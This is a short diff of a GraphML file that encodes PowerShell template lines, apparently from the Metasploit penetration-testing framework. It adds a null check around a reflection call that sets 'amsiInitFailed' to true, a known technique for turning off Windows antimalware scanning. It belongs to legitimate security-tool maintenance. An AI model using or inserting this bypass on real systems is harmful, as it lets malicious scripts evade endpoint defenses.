@@ -32,7 +32,7 @@
         <node id="block.1:instruction.4">
           <data key="address">4</data>
           <data key="type">instruction</data>
-          <data key="instruction.source">    $Ref1.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('amsiInitFailed') %&gt;,'NonPublic,Static').SetValue($null,$true);</data>
+          <data key="instruction.source">    if ($Ref1) { $Ref1.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('amsiInitFailed') %&gt;,'NonPublic,Static').SetValue($null,$true); };</data>
         </node>
         <node id="block.1:instruction.5">
           <data key="address">5</data>
@@ -159,7 +159,7 @@
         <node id="block.19:instruction.22">
           <data key="address">22</data>
           <data key="type">instruction</data>
-          <data key="instruction.source">}</data>
+          <data key="instruction.source">};</data>
         </node>
         <edge source="block.19:instruction.19" target="block.19:instruction.20"/>
         <edge source="block.19:instruction.20" target="block.19:instruction.21"/>
